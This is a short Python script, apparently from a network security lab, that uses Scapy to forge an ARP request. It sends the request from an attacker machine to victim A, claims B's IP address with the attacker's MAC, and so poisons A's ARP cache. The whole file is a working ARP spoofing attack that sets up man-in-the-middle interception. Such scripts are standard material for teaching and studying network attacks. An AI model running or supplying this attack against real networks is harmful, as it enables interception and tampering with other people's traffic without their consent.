from scapy.all import *

# Victim A's values
a_mac   = "02:42:0a:09:00:05"   # MAC of A
a_ip    = "10.9.0.5"            # IP of A

# Victim B's values
b_mac   = "02:42:0a:09:00:06"   # MAC of B
b_ip    = "10.9.0.6"            # IP of B

# Attacker's values
m_mac   = "02:42:0a:09:00:69"   # MAC of M
m_ip    = "10.9.0.105"          # IP of M

# Forge an ARP request to A, asking "Who has B's IP?"
arp_req = ARP(
    op=1,               # ARP request
    psrc=b_ip,          # Claim to be B (pretending to be B IP Address)
    hwsrc=m_mac,        # Send M's MAC (attacker's MAC)
    pdst=b_ip,          # Asking "Who has B's IP?"
)

eth = Ether(dst=a_mac, src=m_mac)   # Send directly to A
pkt = eth / arp_req         # Combine Ethernet and ARP layers

sendp(pkt, iface="eth0")    # Send the packet on the specified interface